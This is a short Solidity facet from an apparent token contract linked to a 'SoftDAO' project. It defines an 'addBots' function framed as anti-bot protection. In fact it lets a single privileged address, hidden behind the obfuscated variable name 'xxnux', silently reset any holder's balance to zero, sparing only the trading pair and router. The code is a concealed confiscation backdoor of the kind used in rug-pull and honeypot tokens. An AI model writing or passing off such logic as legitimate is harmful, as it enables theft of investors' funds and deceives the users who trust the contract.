/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.thesoftdao.com
 * X: https://twitter.com/thesoftdao
 * Tele: https://t.me/theSoftDAO
 * Discord: https://discord.com/invite/thesoftdao
 */

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract addBotsFacet {
    function addBots(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
